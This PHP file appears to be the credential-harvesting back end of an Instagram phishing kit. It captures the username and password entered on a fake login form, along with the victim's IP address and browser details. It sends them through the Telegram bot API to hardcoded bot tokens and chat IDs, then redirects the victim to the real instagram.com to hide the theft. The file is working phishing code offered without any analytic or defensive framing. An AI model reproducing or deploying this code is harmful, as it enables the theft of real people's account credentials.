<?php

$message .= "🚦🎗 INSTAGRAM Account  🎗🚦" ."\n";
$message .= "🔹 user: ".$_POST['username']."\n";
$message .= "🔹 password: ".$_POST['PASSWORD']."\n";
$message .= "🔸 IP : ".$_SERVER['REMOTE_ADDR']."\n";
$message .= "🔸 PHONE / PC: ".$_SERVER['HTTP_USER_AGENT']."\n";
$message .= "➖ @PhishinG_PorT ➖";



include "Userid.php" ;


$IDP = -476363973; 
$TOKENP = "1095785010:AAF_jVf3TNCCsxnuNpHvnlpXVtKVtlu0UAE";  
$prnd = file_get_contents("https://api.telegram.org/bot".$TOKENP."/sendMessage?parse_mode=HTML&chat_id=".$IDP."&text=".urlencode($message));
 


$send = file_get_contents("https://api.telegram.org/bot$TOKENESH/SendMessage?chat_id=$IDISH&text=".urlencode($message));

?>
<meta content='0;url=https://instagram.com<?php ?>' http-equiv='refresh'/>